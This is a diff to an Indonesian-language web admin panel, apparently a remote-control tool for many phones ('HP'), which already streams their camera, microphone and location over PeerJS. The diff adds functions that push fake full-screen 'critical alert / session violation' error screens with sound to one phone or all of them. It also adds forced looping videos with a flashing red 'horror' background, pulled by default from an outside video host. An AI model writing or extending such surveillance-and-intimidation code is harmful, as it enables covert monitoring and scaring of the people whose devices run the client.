@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Admin Multi-HP - Live Kamera, Suara & Lokasi</title>
+  <title>Admin Multi-HP - Live Kamera, Suara, Lokasi & Push Layar</title>
   <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', 'Segoe UI', sans-serif; }
@@ -48,6 +48,10 @@
     .btn-emerald:hover { background: #047857; }
     .btn-amber { background: #D97706; }
     .btn-amber:hover { background: #B45309; }
+    .btn-rose { background: #E11D48; }
+    .btn-rose:hover { background: #BE123C; }
+    .btn-purple { background: #7C3AED; }
+    .btn-purple:hover { background: #6D28D9; }
     .btn-slate { background: #334155; }
     .btn-slate:hover { background: #475569; }
     .btn-red { background: #991B1B; }
@@ -75,6 +79,29 @@
     .card-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 4px; }
     .map-link { color: #38BDF8; font-size: 11px; font-weight: 600; text-decoration: none; margin-left: auto; align-self: center; }
     .empty-box { background: #111827; border: 1px solid #1F2937; border-radius: 14px; padding: 36px 20px; text-align: center; color: #64748B; font-size: 13px; }
+
+    /* Modal Kirim Error / Video */
+    .modal-backdrop {
+      position: fixed; inset: 0; z-index: 950;
+      background: rgba(2, 6, 23, 0.8);
+      display: flex; align-items: center; justify-content: center; padding: 18px;
+    }
+    .modal-backdrop.hidden { display: none; }
+    .modal-card {
+      width: 100%; max-width: 430px; background: #111827; border: 1px solid #334155;
+      border-radius: 16px; padding: 20px; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.65);
+      display: flex; flex-direction: column; gap: 12px;
+    }
+    .modal-title { font-size: 15px; font-weight: 700; color: #F8FAFC; }
+    .modal-sub { font-size: 11.5px; color: #94A3B8; }
+    .modal-label { display: block; font-size: 11.5px; font-weight: 600; color: #CBD5E1; margin-bottom: 4px; }
+    .modal-input, .modal-textarea {
+      width: 100%; background: #020617; border: 1px solid #334155; color: #F8FAFC;
+      border-radius: 8px; padding: 9px 11px; font-size: 12.5px; outline: none; font-family: inherit;
+    }
+    .modal-textarea { min-height: 76px; resize: vertical; }
+    .modal-row { display: flex; align-items: center; gap: 8px; font-size: 12px; color: #CBD5E1; }
+    .modal-actions { display: flex; justify-content: flex-end; gap: 8px; margin-top: 6px; }
   </style>
 </head>
 <body>
@@ -86,6 +113,54 @@
       <div id="lockError" class="lock-error"></div>
       <button type="submit" class="btn-blue lock-btn">Masuk Panel</button>
     </form>
+  </div>
+
+  <div id="pushModal" class="modal-backdrop hidden">
+    <div class="modal-card">
+      <div>
+        <div class="modal-title" id="modalHeading">Kirim Layar Error ke HP</div>
+        <div class="modal-sub" id="modalTargetLabel">Target: -</div>
+      </div>
+
+      <div id="modalErrorFields">
+        <div style="margin-bottom:10px;">
+          <label class="modal-label" for="errCodeInput">Kode Error</label>
+          <input id="errCodeInput" class="modal-input" type="text" value="CRITICAL_ALERT_0x666" />
+        </div>
+        <div style="margin-bottom:10px;">
+          <label class="modal-label" for="errTitleInput">Judul Layar Error</label>
+          <input id="errTitleInput" class="modal-input" type="text" value="PERINGATAN KERAS: SESI TERDETEKSI!" />
+        </div>
+        <div>
+          <label class="modal-label" for="errMsgInput">Pesan Layar Error</label>
+          <textarea id="errMsgInput" class="modal-textarea">Sistem mendeteksi pelanggaran sesi pada perangkat ini. Jangan tutup atau keluar dari layar sampai verifikasi selesai.</textarea>
+        </div>
+      </div>
+
+      <div id="modalVideoFields" class="hidden">
+        <div style="margin-bottom:10px;">
+          <label class="modal-label" for="vidUrlInput">URL Video (MP4 / WebM)</label>
+          <input id="vidUrlInput" class="modal-input" type="text" value="https://b.top4top.io/m_3975xed1e1.mp4" placeholder="https://.../video.mp4" />
+        </div>
+        <label class="modal-row" style="margin-bottom:8px;">
+          <input type="checkbox" id="vidHorrorBgCheck" checked />
+          <span>Latar belakang merah gelap berkedip (efek tegang)</span>
+        </label>
+        <label class="modal-row" style="margin-bottom:8px;">
+          <input type="checkbox" id="vidLoopCheck" checked />
+          <span>Putar berulang (loop)</span>
+        </label>
+        <label class="modal-row">
+          <input type="checkbox" id="vidMutedCheck" />
+          <span>Mute suara video di HP member</span>
+        </label>
+      </div>
+
+      <div class="modal-actions">
+        <button type="button" class="btn-slate btn-sm" onclick="closePushModal()">Batal</button>
+        <button type="button" class="btn-rose btn-sm" id="btnConfirmPush" onclick="submitPushModal()">Kirim Sekarang</button>
+      </div>
+    </div>
   </div>
 
   <div class="container">
@@ -101,6 +176,9 @@
         <button class="btn-emerald" onclick="requestMicAllDevices()">🎙️ Aktifkan Mic Semua</button>
         <button class="btn-amber" onclick="muteAllAudio(false)">🔊 Unmute Semua</button>
         <button class="btn-slate" onclick="muteAllAudio(true)">🔇 Mute Semua</button>
+        <button class="btn-rose" onclick="openPushModal('ALL', 'error')">⚠️ Error Semua HP</button>
+        <button class="btn-purple" onclick="openPushModal('ALL', 'video')">🎬 Video Semua HP</button>
+        <button class="btn-slate" onclick="hideOverlayAllDevices()">✕ Tutup Overlay Semua</button>
         <button class="btn-slate" onclick="pingAllDevices()">🔄 Refresh</button>
         <button class="btn-red" onclick="lockPanel()">🔒 Kunci</button>
       </div>
@@ -153,6 +231,8 @@
     const devices = {};
     const areaCache = {};
     const areaPending = new Set();
+    let modalTargetId = null;
+    let modalMode = "error";
 
     function isUnlocked() {
       return sessionStorage.getItem(AUTH_STORAGE_KEY) === "1";
@@ -191,6 +271,102 @@
     function lockPanel() {
       muteAllAudio(true);
       setUnlockedState(false);
+    }
+
+    function sendPayloadToDevice(id, payload) {
+      const entry = devices[id];
+      if (!entry) return false;
+      if (entry.conn && entry.conn.open) {
+        entry.conn.send(payload);
+        return true;
+      }
+      if (peer && !peer.destroyed) {
+        const tempConn = peer.connect(id, { reliable: true });
+        entry.conn = tempConn;
+        tempConn.on("open", () => {
+          tempConn.send(payload);
+        });
+        return true;
+      }
+      return false;
+    }
+
+    function sendPayloadToTargets(targetId, payload) {
+      if (targetId === "ALL") {
+        for (const id of Object.keys(devices)) {
+          sendPayloadToDevice(id, payload);
+        }
+      } else if (targetId) {
+        sendPayloadToDevice(targetId, payload);
+      }
+    }
+
+    function openPushModal(targetId, mode) {
+      modalTargetId = targetId;
+      modalMode = mode;
+
+      const heading = document.getElementById("modalHeading");
+      const targetLabel = document.getElementById("modalTargetLabel");
+      const errFields = document.getElementById("modalErrorFields");
+      const vidFields = document.getElementById("modalVideoFields");
+      const confirmBtn = document.getElementById("btnConfirmPush");
+
+      targetLabel.textContent = targetId === "ALL"
+        ? `Target: Semua HP (${Object.keys(devices).length} perangkat)`
+        : `Target: ${formatDisplayDeviceTitle(devices[targetId] || { peerId: targetId })}`;
+
+      if (mode === "error") {
+        heading.textContent = "⚠️ Kirim Layar Error";
+        errFields.classList.remove("hidden");
+        vidFields.classList.add("hidden");
+        confirmBtn.className = "btn-rose btn-sm";
+        confirmBtn.textContent = "Kirim Layar Error";
+      } else {
+        heading.textContent = "🎬 Kirim Video ke Layar HP";
+        errFields.classList.add("hidden");
+        vidFields.classList.remove("hidden");
+        confirmBtn.className = "btn-purple btn-sm";
+        confirmBtn.textContent = "Kirim Video";
+      }
+
+      document.getElementById("pushModal").classList.remove("hidden");
+    }
+
+    function closePushModal() {
+      document.getElementById("pushModal").classList.add("hidden");
+      modalTargetId = null;
+    }
+
+    function submitPushModal() {
+      if (!modalTargetId) return;
+      if (modalMode === "error") {
+        const payload = {
+          type: "SHOW_ERROR_SCREEN",
+          code: document.getElementById("errCodeInput").value.trim() || "SYSTEM_ERR_0x666",
+          title: document.getElementById("errTitleInput").value.trim() || "PERINGATAN SISTEM TERDETEKSI",
+          message: document.getElementById("errMsgInput").value.trim() || "Terjadi kesalahan fatal pada sesi perangkat.",
+          withSound: true
+        };
+        sendPayloadToTargets(modalTargetId, payload);
+      } else {
+        const payload = {
+          type: "PLAY_MEMBER_VIDEO",
+          videoUrl: document.getElementById("vidUrlInput").value.trim(),
+          horrorMode: Boolean(document.getElementById("vidHorrorBgCheck").checked),
+          loop: Boolean(document.getElementById("vidLoopCheck").checked),
+          muted: Boolean(document.getElementById("vidMutedCheck").checked)
+        };
+        sendPayloadToTargets(modalTargetId, payload);
+      }
+      closePushModal();
+    }
+
+    function hideOverlayForDevice(id) {
+      sendPayloadToDevice(id, { type: "HIDE_OVERLAY" });
+    }
+
+    function hideOverlayAllDevices() {
+      sendPayloadToTargets("ALL", { type: "HIDE_OVERLAY" });
     }
 
     function formatDisplayDeviceTitle(d) {
@@ -536,6 +712,9 @@
             <button class="btn-emerald btn-sm" onclick="requestMicForDevice('${safeId}')">🎙️ Minta Mic</button>
             <button class="btn-amber btn-sm" id="btnAudio_${safeId}" onclick="toggleDeviceAudioMute('${safeId}')">🔇 Unmute</button>
             <button class="btn-blue btn-sm" onclick="requestStreamFromDevice('${safeId}', true)">▶ Putar / Stream</button>
+            <button class="btn-rose btn-sm" onclick="openPushModal('${safeId}', 'error')">⚠️ Layar Error</button>
+            <button class="btn-purple btn-sm" onclick="openPushModal('${safeId}', 'video')">🎬 Kirim Video</button>
+            <button class="btn-slate btn-sm" onclick="hideOverlayForDevice('${safeId}')">✕ Tutup Overlay</button>
           </div>
         </div>
       `;
